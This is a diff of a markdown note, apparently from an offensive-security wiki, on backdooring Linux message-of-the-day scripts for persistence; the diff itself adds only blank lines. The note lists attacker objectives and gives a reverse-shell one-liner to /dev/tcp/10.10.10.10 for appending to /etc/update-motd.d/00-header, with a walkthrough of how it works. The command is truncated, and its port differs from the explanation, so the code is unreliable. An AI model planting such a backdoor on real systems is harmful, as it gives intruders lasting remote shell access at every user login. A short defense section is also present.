@@ -34,6 +34,8 @@ To execute this technique, the attacker must modify the MOTD file to include a c
 
 This technique can be particularly effective because the MOTD file is executed every time a user logs in, so the attacker's code will be executed every time the system is accessed.
 
+ 
+
 ## Requirements
 
 1. Access to the target Linux system
@@ -41,6 +43,8 @@ This technique can be particularly effective because the MOTD file is executed e
 1. Ability to modify the MOTD file
 
 1. Ability to establish a reverse shell connection
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ This technique can be particularly effective because the MOTD file is executed e
 
 1. Implement network segmentation to limit lateral movement
 
+ 
+
 ## Objectives
 
 1. Establish persistence on a compromised Linux system
@@ -58,11 +64,19 @@ This technique can be particularly effective because the MOTD file is executed e
 
 1. Execute further attacks on the compromised system
 
+ 
+
 # Instructions
 
 1. This command appends a reverse shell one-liner to the 00-header file in the /etc/update-motd.d/ directory. When the file is executed, it will establish a reverse shell connection to the specified IP address and port.
 
+ 
+
+
+
 **Code**: [[echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/444]]
+
+
 
 > The `echo` command is used to write the reverse shell one-liner to the 00-header file. The one-liner uses `bash -c` to execute a new instance of the Bash shell with the `-i` option to enable interactive mode. The `>& /dev/tcp/10.10.10.10/4444` portion redirects the standard output and standard error streams to the specified IP address and port using the TCP protocol. The `0>&1` portion redirects the standard input stream to the standard output stream, which allows the attacker to interact with the remote shell. Finally, the `>> /etc/update-motd.d/00-header` portion appends the one-liner to the end of the 00-header file, which is executed every time a user logs in to the system.
 
@@ -85,3 +99,5 @@ This technique can be particularly effective because the MOTD file is executed e
 
 - [[Backdooring Message of the Day]]
 - [[Linux - Persistence]]
+
+
